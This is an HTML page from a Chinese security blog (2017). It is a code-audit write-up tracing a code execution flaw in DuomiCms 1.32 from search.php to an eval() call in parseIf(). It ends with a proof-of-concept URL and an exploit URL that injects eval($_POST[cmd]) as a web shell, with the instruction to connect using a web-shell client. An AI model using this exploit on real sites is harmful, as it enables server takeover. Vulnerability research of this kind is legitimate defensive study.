@@ -1,0 +1,253 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://github.com/hucmosin/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://github.com/hucmosin">
+<meta name="author" content="Mosin">
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>duomicms1.32代码执行漏洞 - Mosin&#39; Blog</title>
+
+<meta name="keywords" content="审计">
+
+<meta name="description " content="Learning, summarizing, thinking, feeling and knowledge management">
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="聊">聊</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-weixin-mp" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Mosin&#39;s Blog</h1>
+        <h3 class="cover-siteTitle">聊技术，谈情怀</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/hucmosin" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/code-audit" data-name="审计">审计</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/technology" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-share" data-name="分享">分享</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-note" data-name="学习">学习</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others-end" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">Input Search key Words Here</label>
+        <input class="search-field" type="text" name="s" class="text" placeholder="Input Search key Words Here" />
+        <button type="submit" class="search-form-submit" title="Search"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input"  placeholder="请输入关键字"/>   <!-- placeholder="Type something..."/>-->
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://github.com/hucmosin" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="https://github.com/hucmosin" target="_blank">mosin</a>
+                    <span title="最后编辑于2017-11-14">2017-11-14</span>
+                </p>
+                <p>灵魂无处安放,所以选择流浪</p>
+            </div>
+            <h2 class="post-title">DuomiCms1.32代码执行漏洞</h2>
+            <div class="post-meta">
+                本文总共5876个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>CMS版本 DuomiCms_v1.32</p>
+<p>漏洞的初始接口在./search.php文件中，打开该文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $k=&gt;$v)</span><br><span class="line">&#123;</span><br><span class="line">$area=str_replace(&quot;phpinfo()&quot;,&quot;&quot;,$area);</span><br><span class="line">$jq=str_replace(&quot;phpinfo()&quot;,&quot;&quot;,$jq);</span><br><span class="line">$order=str_replace(&quot;phpinfo()&quot;,&quot;&quot;,$order);</span><br><span class="line">$year=str_replace(&quot;phpinfo()&quot;,&quot;&quot;,$year);</span><br><span class="line">$area=str_replace(&quot;&apos;&quot;,&quot;&quot;,$area);</span><br><span class="line">$jq=str_replace(&quot;&apos;&quot;,&quot;&quot;,$jq);</span><br><span class="line">$order=str_replace(&quot;&apos;&quot;,&quot;&quot;,$order);</span><br><span class="line">$year=str_replace(&quot;&apos;&quot;,&quot;&quot;,$year);</span><br><span class="line">$$k=_RunMagicQuotes(gbutf8(RemoveXSS($v)));</span><br><span class="line">$schwhere.= &quot;&amp;$k=&quot;.urlencode($$k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到文件对变量<code>$area</code>进行了简单的过滤，我们这里主要关注<code>$area</code>变量，跟进变量处理。</p>
+<p>下面调用了函数<code>echosearchPage()</code>，我们跟进函数。</p>
+<p>找到变量<code>$area</code>我们来到这个地方，第186行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content=$mainClassObj-&gt;parseSearchItemList($content,&quot;area&quot;);</span><br></pre></td></tr></table></figure>
+<p>函数<code>parseSearchItemList()</code>对变量进行了处理，我们跟进这个函数,文件在/duomiphp/core.class.php中。<br>在这个地方，文件core.class.php是加密的，鄙人不才，解不了密。但是从search.php文件发现一个问题就是，这个文件在很多的影视网站都存在，所以随便找一份影视的源码，定位文件。</p>
+<p>经分析，漏洞定位到这段代码,在函数<code>parseIf()</code>中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">function parseIf($content)&#123;</span><br><span class="line">        if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br><span class="line">        return $content;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">        $labelRule2=&quot;&#123;elseif&quot;;</span><br><span class="line">        $labelRule3=&quot;&#123;else&#125;&quot;;</span><br><span class="line">        preg_match_all($labelRule,$content,$iar);</span><br><span class="line">        $arlen=count($iar[0]);</span><br><span class="line">        $elseIfFlag=false;</span><br><span class="line">        for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">            $strIf=$iar[1][$m];</span><br><span class="line">            $strIf=$this-&gt;parseStrIf($strIf);</span><br><span class="line">            $strThen=$iar[2][$m];</span><br><span class="line">            $strThen=$this-&gt;parseSubIf($strThen);</span><br><span class="line">            if (strpos($strThen,$labelRule2)===false)&#123;</span><br><span class="line">                if (strpos($strThen,$labelRule3)&gt;=0)&#123;</span><br><span class="line">                    $elsearray=explode($labelRule3,$strThen);</span><br><span class="line">                    $strThen1=$elsearray[0];</span><br><span class="line">                    $strElse1=$elsearray[1];</span><br><span class="line">                    @eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">                    if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);</span><br><span class="line">                if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $elseIfArray=explode($labelRule2,$strThen);</span><br><span class="line">                $elseIfArrayLen=count($elseIfArray);</span><br><span class="line">                $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);</span><br><span class="line">                $resultStr=$elseIfSubArray[1];</span><br><span class="line">                $elseIfArraystr0=addslashes($elseIfArray[0]);</span><br><span class="line">                @eval(&quot;if($strIf)&#123;\$resultStr=\&quot;$elseIfArraystr0\&quot;;&#125;&quot;);</span><br><span class="line">                for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123;</span><br><span class="line">                    $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">                    $strElseIf=$this-&gt;parseStrIf($strElseIf);</span><br><span class="line">                    $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">                    @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);</span><br><span class="line">                    @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;);</span><br><span class="line">                    if ($elseIfFlag) &#123;break;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">                $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">                if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0);</span><br><span class="line">                @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen0\&quot;;\$elseIfFlag=true;&#125;&quot;);</span><br><span class="line">                $content=str_replace($iar[0][$m],$resultStr,$content);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $content;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>$area变量处理到这里，引发了漏洞，定位漏洞代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">for($m=0;$mparseStrIf($strIf);</span><br><span class="line">           $strThen=$iar[2][$m];</span><br><span class="line">           $strThen=$this-&gt;parseSubIf($strThen);</span><br><span class="line">           if (strpos($strThen,$labelRule2)===false)&#123;</span><br><span class="line">               if (strpos($strThen,$labelRule3)&gt;=0)&#123;</span><br><span class="line">                   $elsearray=explode($labelRule3,$strThen);</span><br><span class="line">                   $strThen1=$elsearray[0];</span><br><span class="line">                   $strElse1=$elsearray[1];</span><br><span class="line">                   @eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">                   if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;</span><br><span class="line">               &#125;else&#123;</span><br><span class="line">               //漏洞执行处</span><br><span class="line">               @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);</span><br><span class="line">               if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
+<p> 漏洞发生在这段代码，<code>@eval()</code>函数执行代码.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br></pre></td></tr></table></figure>
+<p>变量经处理后到这个地方就直接输出了，我们来我们构造POC</p>
+<p>POC: /search.php?searchtype=5&amp;tid=&amp;area=phpinfo()</p>
+<p>EXP: /search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</p>
+<p>直接菜刀连接密码cmd</p>
+
+        </div>
+		<!--dashang-->
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/代码审计/">代码审计</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文内容仅作为作者个人兴趣与观点,若有不恰当之处，望不吝赐教</p>
+    
+    
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help" >帮助</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="友情链接">友情链接</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+        </p>
+        <p>
+            Blog by <a href="https://github.com/hucmosin" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+    </div>
+</footer>
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script src="/js/InsightSearch.js"></script>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '10/20/2017',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            wxMpImg: '/images/weixin-mp.png',
+        });
+    });
+</script>
+</body>
+</html>
